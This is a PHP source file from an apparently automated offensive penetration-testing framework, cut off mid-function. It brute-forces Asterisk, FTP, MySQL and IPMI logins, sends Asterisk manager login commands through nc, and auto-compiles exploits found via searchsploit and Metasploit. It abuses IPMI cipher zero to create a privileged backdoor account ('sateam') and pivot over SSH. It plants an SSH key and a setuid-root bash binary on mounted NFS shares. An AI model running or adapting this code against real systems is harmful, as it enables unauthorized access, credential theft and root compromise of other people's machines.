<?php


class service2asterisk extends check4linux {


    public function __construct($stream,$eth,$domain,$ip,$port,$service_protocol) {
        parent::__construct($stream,$eth,$domain,$ip,$port,$service_protocol);
    }



public function service2asterisk2auth($stream,$user2name){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $users_pass = file("$this->dico_password.1000");
    foreach ($users_pass as $user2pass){
        $user2pass = trim($user2pass);
        $check = $this->auth2login_asterisk($user2name,$user2pass);
        if ($check==TRUE) {
            $result .= $this->yesAUTH($this->ip, $this->port2id, $user2name, $user2pass,__FUNCTION__);
            $result .= $this->ssTitre("Display All Users");
            $query = "echo 'action: login\r\nusername: $user2name\r\nsecret: $user2pass\r\n\r\naction: command\r\ncommand: sip show users\r\n' | nc $this->ip $this->port -v -w3 -n ";
            $result .= $this->cmd("localhost",$query);
            $result .= $this->req_ret_str($query);
            $query = "echo 'action: login\r\nusername: $user2name\r\nsecret: $user2pass\r\n\r\naction: GetConfig\r\nFilename: sip.conf\r\n' | nc $this->ip $this->port -v -w3 -n ";
            $result .= $this->cmd("localhost",$query);
            $result .= $this->req_ret_str($query);
            $result .= $this->note("locate voicemail users");
            $query = "echo 'action: login\r\nusername: $user2name\r\nsecret: $user2pass\r\n\r\naction: voicemailuserslist\r\n' | nc $this->ip $this->port -v -w3 -n  ";
            $result .= $this->cmd("localhost",$query);
            $result .= $this->req_ret_str($query); //  | grep -E -i \"(Voicemailbox|fullname)\"
            $result .= $this->ssTitre("ListCommands");
            $query = "echo 'action: login\r\nusername: $user2name\r\nsecret: $user2pass\r\n\r\naction: voicemailuserslist\r\n' | nc $this->ip $this->port -v -w3 -n  | grep -E \"(VoiceMailbox|Fullname)\"";
            $result .= $this->cmd("localhost",$query);
            $result .= $this->req_ret_str($query);
        }
    }
    return $result;
}


public function service2asterisk4exec($stream){
    $result = "";

        $result .= $this->ssTitre(__FUNCTION__);
        
        $users_test = array("root","admin","administrator","guest","user","test","voip");
        foreach ($users_test as $user_test){
            $result .= $this->port2auth4dico4hydra("asterisk",$user_test);
            $result .=  $this->service2asterisk2auth($stream,$user_test);
        }
        
        
        
        
        $sql_r = "select user2name,user2pass FROM AUTH where ip='$this->ip' ORDER BY user2name;";
        $conn = $this->mysql_ressource->query($sql_r);
        while ($row = $conn->fetch_assoc()){
            $user2name = trim($row['user2name']);
            $user2pass = trim($row['user2pass']);
            $result .= $this->article("USER/PASS FOUND FOR TEST", "$user2name/$user2pass");
            if (!empty($user2name)) $result .= $this->port2auth4pass4hydra("asterisk", $user2name, $user2pass);
        }
        
        return $result;
}












public function service2dns4exec(){
    $this->ssTitre(__FUNCTION__);
    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"dns-service-discovery\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX -  ";
    return $this->req2BD($this->colonne,$this->table,"$this->port2where AND service2name = '$this->service_name' AND service2version = '$this->service_version' ",$query);
    
}



public function dns2dot(){
    $dir_img = "./IMG";
    $dns2dot_ns = "";
    $dns2dot_domain = "";
    $dns2dot_edge = "";
    
    $file_output = "$this->dir_tmp/$this->domain.".__FUNCTION__.".dot";
    $color_dns = "darkturquoise";$color_host = "darkturquoise";$color_domain = "darkturquoise";$color_arrow = "darkturquoise";
    $dns2dot_header = "digraph structs {
	label = \"".__FUNCTION__.":$this->domain:DNS\";
		graph [rankdir = \"LR\" layout = dot];
		node [fontsize = \"16\" shape = \"plaintext\"];
		edge [penwidth=2.0 ];";
    
    $dns2dot_ns .= "
		\"$this->dns\" [label=<<TABLE BORDER=\"0\" CELLBORDER=\"1\" CELLSPACING=\"0\" ALIGN=\"LEFT\" >
		<TR><TD>DNS</TD><TD PORT=\"dns\" bgcolor=\"$color_dns\" >$this->dns</TD></TR>
		<TR><TD>MX</TD><TD PORT=\"dns2mx\" >".$this->dot2diagram(str_replace("\n","<BR/>\n",$this->dns2mx()))."</TD></TR>
		<TR><TD>SOA</TD><TD PORT=\"dns2soa\" >".$this->dot2diagram(str_replace("\n","<BR/>\n",$this->dns2soa()))."</TD></TR>
		<TR><TD>TXT</TD><TD PORT=\"dns2txt\"  >".$this->dot2diagram(str_replace("\n","<BR/>\n",$this->dns2txt()))."</TD></TR>
		<TR><TD>AXFR</TD><TD PORT=\"dns2axfr\"  >".$this->dot2diagram(str_replace("\n","<BR/>\n",$this->dns2axfr()))."</TD></TR>
		<TR><TD>CNAME</TD><TD PORT=\"dns2cname\"  >".$this->dot2diagram(str_replace("\n","<BR/>\n",$this->dns2cname()))."</TD></TR>
		<TR><TD>AAAA</TD><TD PORT=\"dns2aaaa\"  >".$this->dot2diagram(str_replace("\n","<BR/>\n",$this->dns2aaaa()))."</TD></TR>
		<TR><TD>NSID</TD><TD PORT=\"dns2nsid\"  >".$this->dot2diagram(str_replace("\n","<BR/>\n",$this->dns2nsid()))."</TD></TR>
		<TR><TD>HINFO</TD><TD PORT=\"dns2hinfo\"  >".$this->dot2diagram(str_replace("\n","<BR/>\n",$this->dns2hinfo()))."</TD></TR>
		<TR><TD>A</TD><TD PORT=\"dns2a\"  >".$this->dot2diagram(str_replace("\n","<BR/>\n",$this->dns2a()))."</TD></TR>
		<TR><TD>PTR</TD><TD PORT=\"dns2ptr\"  >".$this->dot2diagram(str_replace("\n","<BR/>\n",$this->dns2ptr()))."</TD></TR>
	    <TR><TD>RP</TD><TD PORT=\"dns2rp\"  >".$this->dot2diagram(str_replace("\n","<BR/>\n",$this->dns2rp()))."</TD></TR>
	   	<TR><TD>SRV</TD><TD PORT=\"dns2srv\"  >".$this->dot2diagram(str_replace("\n","<BR/>\n",$this->dns2srv()))."</TD></TR>
				</TABLE>>];
	   	    
				";
    
    $dns2dot_edge .= "
				";
    
    
    $dns2dot_footer = "
}";
    
    $dns2dot = $dns2dot_header.$dns2dot_domain.$dns2dot_ns.$dns2dot_edge.$dns2dot_footer;
    $dns2dot4body = $dns2dot_domain.$dns2dot_ns.$dns2dot_edge ;
    //system("echo '$dns2dot' > $file_output ");
    //$this->requette("gedit $file_output");
    //$this->dot2xdot("$file_output ");
    $this->dot4make($file_output,$dns2dot);
    return $dns2dot4body;
}








public function dns2mx(){
    $this->ssTitre(__FUNCTION__." MX Records - List of a host’s or domain’s mail exchanger server(s).");
    $query = "dig @$this->dns $this->domain MX +short | grep -v '^;' ";
    return $this->req2BD(__FUNCTION__,__CLASS__,"domain = '$this->domain' AND dns = '$this->dns'",$query);
    
}


public function dns2soa(){
    $this->ssTitre(__FUNCTION__." SOA Records - Indicates the server that has authority for the domain.");
    $query = "dig @$this->dns $this->domain SOA +short | grep -v '^;' ";
    return $this->req2BD(__FUNCTION__,__CLASS__,"domain = '$this->domain' AND dns = '$this->dns'",$query);
}


public function dns2txt(){
    $this->ssTitre(__FUNCTION__." TXT Records - Generic text record.");
    $query = "dig @$this->dns $this->domain TXT +short | grep -v '^;' ";
    return $this->req2BD(__FUNCTION__,__CLASS__,"domain = '$this->domain' AND dns = '$this->dns'",$query);
}


public function dns2cname(){
    $this->ssTitre(__FUNCTION__." CNAME - A host’s canonical name allows additional names/ aliases to be used to locate a computer.");
    $query = "dig @$this->dns $this->domain CNAME +short | grep -v '^;' ";
    return $this->req2BD(__FUNCTION__,__CLASS__,"domain = '$this->domain' AND dns = '$this->dns'",$query);
}


public function dns2aaaa(){
    $this->ssTitre(__FUNCTION__);
    $query = "dig @$this->dns $this->domain AAAA +short | grep -v '^;' ";
    return $this->req2BD(__FUNCTION__,__CLASS__,"domain = '$this->domain' AND dns = '$this->dns'",$query);
}

public function dns2a(){
    $this->ssTitre(__FUNCTION__." A Records - An address record that allows a computer name to be translated to an IP address.
				Each computer has to have this record for its IP address to be located via DNS.");
    $query = "dig @$this->dns $this->domain A +short | grep -v '^;' ";
    return $this->req2BD(__FUNCTION__,__CLASS__,"domain = '$this->domain' AND dns = '$this->dns'",$query);
}

public function dns2ptr(){
    $this->ssTitre(__FUNCTION__." PTR Records - Lists a host’s domain name, host identified by its IP address.");
    $query = "nslookup -query=ptr ".gethostbyname($this->dns)." | grep 'name' | cut -d'=' -f2 | sed \"s/\.$//g\" | tr -d ' ' | grep  -i -Po \"([0-9a-zA-Z_-]{1,}\.)+[a-zA-Z]{1,4}\"  ";
    return $this->req2BD(__FUNCTION__,__CLASS__,"domain = '$this->domain' AND dns = '$this->dns'",$query);
}


public function dns2axfr(){
    $this->ssTitre(__FUNCTION__);
    $query = "dig @$this->dns $this->domain axfr +short | grep -v '^;' ";
    return $this->req2BD(__FUNCTION__,__CLASS__,"domain = '$this->domain' AND dns = '$this->dns'",$query);
}


public function dns2hinfo(){
    $this->ssTitre(__FUNCTION__." HINFO Records - Host information record with CPU type and operating system.");
    $query = "dig @$this->dns $this->domain HINFO +short | grep -v '^;' ";
    return $this->req2BD(__FUNCTION__,__CLASS__,"domain = '$this->domain' AND dns = '$this->dns'",$query);
}


public function dns2srv(){
    $this->ssTitre(__FUNCTION__." SRV Records - Service location record.");
    $query = "dig @$this->dns $this->domain SRV +short | grep -v '^;' ";
    return $this->req2BD(__FUNCTION__,__CLASS__,"domain = '$this->domain' AND dns = '$this->dns'",$query);
}


public function dns2rp(){
    $this->ssTitre(__FUNCTION__." Responsible person for the domain.");
    $query = "dig @$this->dns $this->domain RP +short | grep -v '^;' ";
    return $this->req2BD(__FUNCTION__,__CLASS__,"domain = '$this->domain' AND dns = '$this->dns'",$query);
}

public function dns2nsid(){
    $this->ssTitre(__FUNCTION__);
    $query = "echo '$this->root_passwd' | sudo -S nmap --script dns-nsid -p 53 $this->dns -Pn -n  -oX - ";
    return $this->req2BD(__FUNCTION__,__CLASS__,"domain = '$this->domain' AND dns = '$this->dns'",$query);
}

public function dns4pentest($stream){ // OK
    $result = "";
    $result .= $this->gtitre(__FUNCTION__);
    $result .= $this->dns2a($stream);
    $result .= $this->dns2aaaa($stream);
    $result .= $this->dns2axfr($stream);
    $result .= $this->dns2cname($stream);
    $result .= $this->dns2hinfo($stream);
    $result .= $this->dns2mx($stream);
    $result .= $this->dns2nsid($stream);
    $result .= $this->dns2ptr($stream);
    $result .= $this->dns2rp($stream);
    $result .= $this->dns2soa($stream);
    $result .= $this->dns2srv($stream);
    $result .= $this->dns2txt($stream);
    return $result;
}
















public function service2exploitdb4exec(){
    $this->ssTitre(__FUNCTION__);
    $result = "";
    $exploitdb_rst = array();
    $msf_rst = array();
    
    $exploitdb_rst = $this->service2exploitdb4files4list();
    $result .= $this->tab($exploitdb_rst);
    $this->pause();
    $size_files = count($exploitdb_rst);
    // if ($size_files<=5)
    foreach ($exploitdb_rst as $file_exploit){
        $result .= $this->exploit2file2compile("", "", $file_exploit);
    }
    $this->pause();
    if (empty($exploitdb_rst)){
        $msf_rst = $this->service2msf4files4list();
        $result .= $this->tab($msf_rst);
        $this->pause();
        $size_files = count($msf_rst);
        if ($size_files<=5)
            foreach ($msf_rst as $exploit){
                $result .= $this->msf2info($exploit);
        }
        $this->pause();
    }
    if ( ($this->service_name==="http") || ($this->service_name==="https") ) {
        $result .= $this->web4exploits($this->ip, $this->port);
    }
    $this->pause();
    echo $result;
    return $result;
}

public function service2exploitdb4files4list(){
    $this->ssTitre(__FUNCTION__);
    $files_rst = array();
    //if (!file_exists("/usr/bin/searchsploit")) $this->install_exploit_exploitdb();
    if ( ((!empty($this->service_extrainfo)) || (!empty($this->service_product))) && ((!empty($this->service_version)) && (!empty($this->service_name))) ) {
        $search = "$this->service_name $this->service_version $this->service_product $this->service_extrainfo";
        $files_rst += $this->exploitdb($search);
    }
    if (!empty($files_rst)) return array_unique(array_filter($files_rst));
    if ((!empty($this->service_product)) && (!empty($this->service_version)) && (!empty($this->service_name)) )  {
        $search = "$this->service_name $this->service_version $this->service_product";
        $files_rst += $this->exploitdb($search);
    }
    if (!empty($files_rst)) return array_unique(array_filter($files_rst));
    if ((!empty($this->service_version)) && (!empty($this->service_name)) ) {
        $search = "$this->service_name $this->service_version";
        $files_rst += $this->exploitdb($search);
    }
    if (!empty($files_rst)) return array_unique(array_filter($files_rst));
    if ((!empty($this->service_product)) && (!empty($this->service_version)) ) {
        $search = "$this->service_version $this->service_product";
        $files_rst += $this->exploitdb($search);
    }
    if (!empty($files_rst)) return array_unique(array_filter($files_rst));
    if ((!empty($this->service_product)) && (!empty($this->service_name)) ) {
        $search = "$this->service_name $this->service_product";
        $files_rst += $this->exploitdb($search);
    }
    if (!empty($files_rst)) return array_unique(array_filter($files_rst));
    return $files_rst;
}


public function service2msf4files4list(){
    $this->ssTitre(__FUNCTION__);
    $files_rst = array();
    //if (!file_exists("/usr/bin/searchsploit")) $this->install_exploit_exploitdb();
    if ( ((!empty($this->service_extrainfo)) || (!empty($this->service_product))) && ((!empty($this->service_version)) && (!empty($this->service_name))) ) {
        $search = "$this->service_name $this->service_version $this->service_product $this->service_extrainfo";
        $files_rst += $this->msf2search($search);
    }
    if (!empty($files_rst)) return array_unique(array_filter($files_rst));
    if ((!empty($this->service_product)) && (!empty($this->service_version)) && (!empty($this->service_name)) )  {
        $search = "$this->service_name $this->service_version $this->service_product";
        $files_rst += $this->msf2search($search);
    }
    if (!empty($files_rst)) return array_unique(array_filter($files_rst));
    if ((!empty($this->service_version)) && (!empty($this->service_name)) ) {
        $search = "$this->service_name $this->service_version";
        $files_rst += $this->msf2search($search);
    }
    if (!empty($files_rst)) return array_unique(array_filter($files_rst));
    if ((!empty($this->service_product)) && (!empty($this->service_version)) ) {
        $search = "$this->service_version $this->service_product";
        $files_rst += $this->msf2search($search);
    }
    if (!empty($files_rst)) return array_unique(array_filter($files_rst));
    if ((!empty($this->service_product)) && (!empty($this->service_name)) ) {
        $search = "$this->service_name $this->service_product";
        $files_rst += $this->msf2search($search);
    }
    if (!empty($files_rst)) return array_unique(array_filter($files_rst));
    return $files_rst;
}













public function service2ftp4exec(){
    $result = "";
    
    $this->titre(__FUNCTION__);
    // https://www.jpsecnetworks.com/week-8-oscp-preparation-post-exploitation/
    // https://codemonkeyism.co.uk/post-exploitation-file-transfers/
    // http://devloop.users.sourceforge.net/index.php?article151/solution-du-ctf-c0m80-1-de-vulnhub
    
    
    
    $result .= $this->ftp4auth();
    
    $users_passwd = $this->ip2users4passwd();
    foreach ($users_passwd as $user2name => $user2pass){
        if (!empty($user2name)){
            $check = $this->auth2login_ftp4exec($user2name, $user2pass, "help");
            $this->ftp2pentest($user2name, $user2pass);
            
        }
    }
    
    
    $this->service2exploitdb4exec();
    return $result;
    
}


public function ftp4auth(){
    $this->ssTitre(__FUNCTION__);
    $result = "";
    
    
    $user2name = "user_doesnt_exist";
    $user2pass = "pass_doesnt_exist" ;
    $query_medusa = "medusa -u \"$user2name\" -p \"$user2pass\" -h '$this->ip' -M ftp -f -t 1 -e s -n $this->port  2>/dev/null | grep '\[SUCCESS\]' ";
    if (!empty($this->req_ret_str($query_medusa))) {
        $result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "help");
        $result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "PWD");
        $result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "ls -al");
        return $result;
    }
    
    $this->pause();
    
    $user2name = "anonymous";
    $user2pass = "" ;
    $query_medusa = "medusa -u \"$user2name\" -p \"$user2pass\" -h '$this->ip' -M ftp -f -t 1 -e s -n $this->port  2>/dev/null | grep '\[SUCCESS\]' ";
    if (!empty($this->req_ret_str($query_medusa))) {
        $this->port2auth4pass4medusa("ftp",$user2name,$user2pass);
        $result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "help");
        $result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "PWD");
        $result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "ls -al");
        
    }
    
    
    
    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"ftp-brute.nse\" --script-args userdb=$this->dico_users $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
    $result .= $this->cmd("localhost",$query);
    //$result .= $this->auth2login4nmap($this->req_ret_str($query),"FTP nmap Brute");
    //$xml = file_get_contents("$this->dir_tmp/nmap.ftp.xml");$result .= $this->auth2login4nmap($xml,"FTP nmap Brute");
    
    $this->pause();
    
    
    $tab_users_shell = $this->ip2users();
    if(!empty($tab_users_shell))
        foreach ($tab_users_shell as $user2name_shell){
            $result .= $this->article("USER FOUND FOR TEST", "$user2name_shell");
            $result .= $this->port2auth4dico4medusa("ftp",$user2name_shell);
    }
    return $result;
}




public function ftp2pentest( $remote_username_ftp, $remote_userpass_ftp){
    $this->titre(__FUNCTION__);
    $result = "";
    
    
    $ftp_stream = @ftp_connect($this->ip,$this->port) ;
    
    
    if(@ftp_login($ftp_stream, $remote_username_ftp, $remote_userpass_ftp)){
        echo ftp_systype($ftp_stream);
        
        $result .= $this->ftp2shell($ftp_stream, $remote_username_ftp, $remote_userpass_ftp);
        $this->pause();
        
        echo $result;
    }
    ftp_close($ftp_stream);
    return $result;
}







public function service2ipmi4exec(){
    $result = "";
    
    $result .= $this->service2ipmi2chiper_zero();
    
    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"ipmi-cipher-zero\" $this->ip -s$this->protocol -p $this->port -e $this->eth  | grep   \"State: VULNERABLE\" ";
    $result .= $this->req_ret_str($query);
    
    
    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"ipmi-version\" $this->ip -s$this->protocol -p $this->port -e $this->eth  -oX -";
    $result .= $this->req_ret_str($query);
    
    
    
    
    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"ipmi-brute.nse\" --script-args userdb=$this->dico_users,passdb=$this->dico_users $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
    $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
    
    
    
    return $result;
}

public function service2ipmi2chiper_zero2user($user){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $user2name_created = "sateam";
    $user2name_pass = "sateam123456789";
    $user = trim($user);
    $query = "ipmitool -I lanplus -C 0 -U $user -P hacked -H $this->ip user summary 2> /dev/null | grep 'Enabled User Count  :' | cut -d':' -f2 ";
    $user_id = trim($this->req_ret_str($query));
    
    if(!empty($user_id)) {
        $result .= $this->yesUSERS($this->port2id, $user, __FUNCTION__, "USER ID: $user_id");
        $query = "ipmitool -I lanplus -C 0 -U $user -P hacked -H $this->ip user list | grep -v 'NO ACCESS'  | grep -v 'Link Auth' |  awk '{print $2}' ";
        $users_list = $this->req_ret_str($query);
        $result .= $users_list  ;
        $users_list_tab = explode("\n", $users_list);
        foreach ($users_list_tab as $user_rec) if(!empty($user_rec)) $result .= $this->yesUSERS($this->port2id, $user_rec, __FUNCTION__, "User List:$user");
        $query = "ipmitool -I lanplus -C 0 -U $user -P hacked -H $this->ip user set name $user_id $user2name_created   ";
        $result .= $this->req_ret_str($query);
        $query = "ipmitool -I lanplus -C 0 -U $user -P hacked -H $this->ip user set password $user_id $user2name_pass   ";
        $result .= $this->req_ret_str($query);
        $query = "ipmitool -I lanplus -C 0 -U $user -P hacked -H $this->ip user priv $user_id 4   ";
        $result .= $this->req_ret_str($query);
        $query = "ipmitool -I lanplus -C 0 -U $user -P hacked -H $this->ip user enable $user_id   ";
        $result .= $this->req_ret_str($query);
        $query = "ipmitool -I lanplus -C 0 -U $user -P hacked -H $this->ip user list ";
        $result .= trim($this->req_ret_str($query));
        $this->pause();
        
        
        $ssh_ports_open = $this->ip2ports4service("ssh");
        foreach ($ssh_ports_open as $ssh_port_open){
            $result .= $this->article("SSH PORT FOUND", $ssh_port_open);
            // $find_user
            $stream = $this->stream8ssh8passwd($this->ip, $ssh_port_open, $user2name_created,$user2name_pass);
            if ( is_resource($stream)){
                $result .= $this->yesAUTH($this->port2id, $user2name_created, $user2name_pass, __FUNCTION__." create SSH user $user via IPMI ");
                $obj_lan = new lan4linux($this->port2id, $stream,__FUNCTION__." IPMI2SSH4user:$user:$user2name_created/$user2name_pass");
                $result .=  $obj_lan->lan2root();
                $result .=  $obj_lan->lan2pivot($user2name_created, $user2name_pass);
            }
            
        }
        $this->pause();
        
    }
    return $result;
}


public function service2ipmi2chiper_zero(){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    
    $sql_r = "select distinct(user2name) FROM USERS WHERE id8port = '$this->port2id' ORDER BY user2name;";
    $conn = $this->mysql_ressource->query($sql_r);
    while ($row = $conn->fetch_assoc()){
        $user2name = trim($row['user2name']);
        $this->article("USER FOUND FOR TEST", "$user2name");
        if(!empty($user2name)) {
            sleep(1); // on doit laisser sleep 1
            $result .= $this->service2ipmi2chiper_zero2user($user2name);
        }
    }
    
    
    $dico = "$this->dico_users";
    //$dico = "$this->dir_tmp/ipmi_users.txt";
    $users_dico = file($dico);
    foreach ($users_dico as $user ){
        if(!empty($user)) {
            sleep(1); // on doit laisser sleep 1
            $result .= $this->service2ipmi2chiper_zero2user($user);
        }
    }
    
    
    
    
    return $result ;
}





public function service2mysql4exec(){
    $result = "";
    
    $result .= $this->ssTitre(__FUNCTION__);
    // heavly process
    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"mysql-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
    //$result .= $this->cmd("localhost",$query);$result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
    $this->pause();
    $users_test = array("mysql","mysqld","mail","anonymous","ftp","cisco","root","admin","administrator","guest","user","test","voip");
    foreach ($users_test as $user_test){
        $result .= $this->port2auth4pass4hydra("mysql",$user_test,"password");
    }
    $this->pause();
    //$query = "patator mysql_login host=$this->ip port=$this->port user=$user_test password=FILE1  1=$this->dico_password.1000 -x ignore:fgrep='Access denied for user' ";
    //$result .= $this->cmd("localhost",$query); $result .= $this->req_ret_str($query);
    
    $users = $this->ip2users4passwd();
    foreach ($users as $user2name => $user2pass){
        if (!empty($user2name)) {
            $result .= $this->article("USER/PASS FOUND FOR TEST", "$user2name/$user2pass");
            $query = "sqlmap -d \"mysql://$user2name:$user2pass@$this->ip:$this->port/information_schema\" -f --users --passwords --privileges --schema --comments --answers=Y --batch --disable-coloring ";
            $result .= $this->req_ret_str($query);
            $result .= $this->req_ret_str("mysql --batch --force --host=$this->ip --port=$this->port --user=$user2name --password=$user2pass --connect-timeout=30 --execute=\"show databases;show processlist ;\" --quick --silent 2>/dev/null");
        }
    }
    
    $this->pause();
    
    return $result;
    
}









public function service2netbios4exec(){
    $result = "";
    
    $result .= $this->ssTitre(__FUNCTION__);
    $query = "nbtscan -v $this->ip ";
    $result .= $this->cmd("localhost",$query);
    $result .= $this->req_ret_str($query);
    
    $query = "nmblookup -A $this->ip ";
    $result .= $this->cmd("localhost",$query);
    $result .= $this->req_ret_str($query);
    
    $query = "echo \"db_status\nuse auxiliary/scanner/netbios/nbname\nset RHOSTS $this->ip\nset RPORT $this->port\nset THREADS 8\nrun\nexit\n \" > $this->dir_tmp/".__FUNCTION__.".$this->ip.$this->port.rc && echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/".__FUNCTION__.".$this->ip.$this->port.rc "; // -y /usr/share/metasploit-framework/config/database.yml" ;
    $result .= $this->cmd("localhost",$query);
    $result .= $this->req_ret_str($query);
    
    return $result;
}

function service2netbios2msf(){
    $result = ""; // \nset TARGET 25 \nset AutoRunScript \"hashdump\"\nrun\n use auxiliary/analyze/jtr_crack_fast
    $query = "echo \"db_status\n use \n set RHOST \"$this->ip\"\n run\n \" > $this->dir_tmp/ntlm_hash_john.rc";
    $this->requette($query);
    $this->requette("cat $this->dir_tmp/ntlm_hash_john.rc");
    $this->pause();
    $this->cmd("localhost", "msfconsole -q -r $this->dir_tmp/ntlm_hash_john.rc -y /usr/share/metasploit-framework/config/database.yml");
    $this->pause();
}







public function service2nfs2check4mount($path){
    $query = "echo '$this->root_passwd' | sudo -S mount -t nfs -o vers=3 -o nolock $this->ip:$path /tmp/$this->ip.$this->port.nfs 2>&1 "; // -o nolock
    //$query = "echo '$this->root_passwd' | sudo -S mount -t nfs4 -o proto=tcp,port=$this->port $this->ip:$path /tmp/$this->ip.$this->port.nfs 2>&1 ";
    $check_mount = $this->req_ret_str($query);
    $this->article("CHECK MOUNT", $check_mount);
    if(stristr($check_mount,"access denied") !== false) return FALSE;
    else {$this->note("Yes Mounted");return TRUE;};
}

public function service2nfs4mount2home2authorized_keys($authorized_keys_filepath,$remote_home_user,$remote_username,$local_username,$local_home_user){
    $this->ssTitre(__FUNCTION__);
    $result = "";
    
    $public_key_ssh_rsa_file = "$this->dir_tmp/$this->ip"."_rsa.pub";
    $private_key_ssh_rsa_file = "$this->dir_tmp/$this->ip"."_rsa.priv";
    
    $private_keys = $this->genPrivateKey($private_key_ssh_rsa_file,"");
    $public_keys = $this->key2gen4priv("",10,$private_key_ssh_rsa_file, $public_key_ssh_rsa_file);
    $this->pause();
    
    if (empty($authorized_keys_filepath)){
        if (!is_dir("$local_home_user/.ssh")) $this->requette("echo '$this->root_passwd' | sudo -S sudo -u $local_username mkdir $local_home_user/.ssh");
        $query = "echo '$this->root_passwd' | sudo -S sudo -u $local_username chmod 777 -R $local_home_user/.ssh";
        $this->requette($query);
        $query = "cat $public_key_ssh_rsa_file > $local_home_user/.ssh/authorized_keys";
        $this->requette($query);
        $query = "ls -al $local_home_user/.ssh";
        $this->requette($query);
        $query = "ls -aln $local_home_user/.ssh";
        $this->requette($query);
        $this->pause();
        
        
        $query = "echo '$this->root_passwd' | sudo -S chown $local_username:$local_username  $local_home_user/.ssh/authorized_keys";
        $this->requette($query);
        $query = "ls -al $local_home_user/.ssh";
        $this->requette($query);
        $query = "ls -aln $local_home_user/.ssh";
        $this->requette($query);
        $this->pause();
        
        $query = "find $local_home_user -name authorized_keys -type f 2> /dev/null | grep 'authorized_keys' "; // | grep '$find_user'
        $authorized_keys_filepath = trim($this->req_ret_str($query));
    }
    if (!empty($authorized_keys_filepath)){
        
        $stream = FALSE;
        $query = "cat $authorized_keys_filepath";
        $authorized_keys_str = trim($this->req_ret_str($query));
        $remote_userpass = "";
        
        $result .= $this->key2run($stream, $authorized_keys_filepath, $authorized_keys_str, $remote_username, $remote_userpass, $local_username, $local_home_user);
    }
    return $result;
}

public function service2nfs4mount2home($remote_home_user,$remote_username,$local_username,$local_home_user){
    $this->ssTitre(__FUNCTION__);
    $result = "";
    
    $query = "find $local_home_user -name authorized_keys -type f 2> /dev/null | grep 'authorized_keys' "; // | grep '$find_user'
    $remote_authorized_keys_file = trim($this->req_ret_str($query));
    $result .= $remote_authorized_keys_file;
    
    $this->pause();
    $result .= $this->service2nfs4mount2home2authorized_keys($remote_authorized_keys_file,$remote_home_user,$remote_username,$local_username,$local_home_user);
    return $result;
}

public function service2nfs4mount2start($mounted_dir){
    $this->ssTitre(__FUNCTION__);
    $result = "";
    $query = "df -h | grep '$mounted_dir' ";
    $this->req_ret_str($query);
    
    $query = "stat $mounted_dir ";
    $this->req_ret_str($query);
    
    $this->req_ret_str("ls -al $mounted_dir 2> /dev/null ");
    $this->note("to access a locally mounted share, your uid and gid need to match the ones of the shared directory on the server");
    $query = "ls -dln $mounted_dir ";
    $this->req_ret_str($query);
    $query = "ls -dl $mounted_dir ";
    $this->req_ret_str($query);
    
    $this->pause();
    
    $uid_gid = trim($this->req_ret_str("ls -dln $mounted_dir | cut -d' ' -f3,4 "));
    
    $uid_name = trim($this->req_ret_str("ls -dl $mounted_dir | awk '{printf $3}'"));
    $this->article("UID Name=",$uid_name);
    $uid = exec("echo '$uid_gid' | cut -d' ' -f1 ");
    $this->article("UID=",$uid);
    $gid =  exec("echo '$uid_gid'  | cut -d' ' -f2 ");
    $this->article("GID=",$gid);
    
    if (!preg_match("([a-z]{1,}+)", $uid_name)){
        $find_user = "test";
        
        //$query = "echo '$this->root_passwd' | sudo -S groupmod -g $gid $find_user ";
        $query = "echo '$this->root_passwd' | sudo -S groupadd $find_user --gid $gid";
        $this->req_ret_str($query);
        
        //$query = "echo '$this->root_passwd' | sudo -S usermod -u $uid $find_user";
        $query = "echo '$this->root_passwd' | sudo -S useradd $find_user --uid $uid --gid $gid";
        $this->req_ret_str($query);
        
        $query = "cat /etc/passwd | grep $find_user";
        $this->req_ret_str($query);
        
        $query = "cat /etc/group | grep $find_user";
        $this->req_ret_str($query);
        
        $query = "groups $find_user";
        $this->req_ret_str($query);
        $this->pause();
        
    }
    else {
        $this->article("Exists User UID ", "$uid_name:$uid");
        $query = "cat /etc/passwd | grep \":$uid:\"  | cut -d':' -f1";
        $find_user = $this->req_ret_str($query);
        $find_user;
        $this->pause();
        
    }
    
    //$find_user = "root";
    $find_user = trim($find_user);
    // pieger les bot de cette maniere afin qu'il cree le user puis se connecter
    $query = "ls -al $mounted_dir"; // sudo -u $find_user
    $this->req_ret_str($query);
    
    
    $query = "ls -anl $mounted_dir"; // sudo -u $find_user
    $this->req_ret_str($query);
    $this->pause();
    
    $suid = <<<EOC
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
int main(){
setuid(0);
setgid(0);
system("/bin/bash");
return 0;
}
EOC;
    $data = "echo '$suid' > $mounted_dir/bash.c ";
    $this->req_ret_str($data);
    $this->pause();
    
    $data = "gcc -o $mounted_dir/bash $mounted_dir/bash.c ";
    $this->req_ret_str($data);
    $this->pause();
    
    
    $data = "chmod 4755 $mounted_dir/bash ";
    $this->req_ret_str($data);
    
    $data = "ls -al $mounted_dir/bash";
    $this->req_ret_str($data);
    $this->pause();
    
    
    return $uid_name;
}




public function service2nfs4mount($path_user){
    $result = "";
    $this->ssTitre(__FUNCTION__);
    
    $local_home_user = "/tmp/$this->ip.$this->port.nfs";
    if (!is_dir($local_home_user)) $this->requette("mkdir $local_home_user");
    
    
